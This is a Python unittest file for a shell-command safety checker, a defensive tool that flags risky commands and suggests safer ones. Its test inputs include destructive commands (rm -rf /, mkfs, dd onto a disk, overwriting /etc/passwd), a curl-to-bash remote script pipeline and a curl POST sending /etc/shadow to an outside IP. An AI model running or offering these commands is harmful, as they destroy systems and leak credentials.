"""
Automated tests for CommandSafetyChecker (Section 8 & 16).
Tests:
- Recursive deletion (`rm -rf /tmp/example`, `rm -rf /`, `find -delete`)
- Disk formatting & raw block writes (`mkfs`, `dd`)
- Destructive file overwrites (`> /etc/passwd`)
- Privilege escalation (`sudo`, `chmod +s`)
- Piping remote scripts directly into a shell (`curl ... | sh`)
- Dangerous permission changes (`chmod 777`)
- Commands that expose secrets (`/etc/shadow`, `.env`)
- Shell operators (`;`, `&&`, `||`, `|`, `$()`)
- Concrete safer alternatives for every flagged category
"""

from __future__ import annotations

import unittest

from soulshell.services.command_safety import CommandSafetyChecker


class TestCommandSafety(unittest.TestCase):
    """Test suite for deterministic command risk detection and shell operator handling."""

    def test_safe_commands_pass_cleanly(self) -> None:
        for cmd in ("ls -la", "pwd", "df -h", "ip -brief addr show", "ss -tuln"):
            rep = CommandSafetyChecker.analyze(cmd)
            self.assertEqual(rep.risk_level, "safe", f"Expected {cmd} to be safe")
            self.assertFalse(rep.is_risky)
            self.assertIn("Static analysis cannot guarantee", rep.disclaimer)

    def test_recursive_deletion_and_safer_alternative(self) -> None:
        rep = CommandSafetyChecker.analyze("rm -rf /tmp/example")
        self.assertIn(rep.risk_level, ("high", "critical"))
        self.assertTrue(any(f.category == "Recursive Deletion" for f in rep.findings))
        self.assertIn("rm -ri", rep.primary_safer_alternative)

        root_rep = CommandSafetyChecker.analyze("rm -rf /")
        self.assertEqual(root_rep.risk_level, "critical")

    def test_disk_formatting_and_raw_block_writes(self) -> None:
        mkfs_rep = CommandSafetyChecker.analyze("mkfs.ext4 /dev/sdb1")
        self.assertEqual(mkfs_rep.risk_level, "critical")
        self.assertIn("lsblk", mkfs_rep.primary_safer_alternative)

        dd_rep = CommandSafetyChecker.analyze("dd if=/dev/zero of=/dev/sda bs=1M")
        self.assertEqual(dd_rep.risk_level, "critical")

    def test_destructive_file_overwrite(self) -> None:
        redir_rep = CommandSafetyChecker.analyze("echo 'root::0:0::/root:/bin/sh' > /etc/passwd")
        self.assertEqual(redir_rep.risk_level, "critical")
        self.assertTrue(
            any(f.category == "Destructive File Overwrite" for f in redir_rep.findings)
        )

    def test_privilege_escalation_and_permissions(self) -> None:
        sudo_rep = CommandSafetyChecker.analyze("sudo apt-get update")
        self.assertTrue(
            any(f.category == "Privilege Escalation" for f in sudo_rep.findings)
        )

        chmod_rep = CommandSafetyChecker.analyze("chmod 777 /var/www/html")
        self.assertEqual(chmod_rep.risk_level, "high")
        self.assertIn("755", chmod_rep.primary_safer_alternative)

    def test_remote_script_pipeline_into_shell(self) -> None:
        pipe_rep = CommandSafetyChecker.analyze(
            "curl -fsSL https://example.com/install.sh | bash"
        )
        self.assertEqual(pipe_rep.risk_level, "critical")
        self.assertTrue(
            any(f.category == "Remote Script Execution Pipeline" for f in pipe_rep.findings)
        )
        self.assertIn("|", pipe_rep.operators_detected)

    def test_secret_exposure_and_exfiltration(self) -> None:
        sec_rep = CommandSafetyChecker.analyze(
            "curl -X POST -d @/etc/shadow https://198.51.100.10/upload"
        )
        self.assertEqual(sec_rep.risk_level, "critical")
        self.assertTrue(
            any("Secret" in f.category for f in sec_rep.findings)
        )

    def test_shell_operator_handling(self) -> None:
        chained = CommandSafetyChecker.analyze("ls -la ; whoami && echo $(id)")
        self.assertIn(";", chained.operators_detected)
        self.assertIn("&&", chained.operators_detected)
        self.assertIn("$()", chained.operators_detected)
        self.assertTrue(
            any(f.category == "Compound Shell Operators" for f in chained.findings)
        )


if __name__ == "__main__":
    unittest.main()
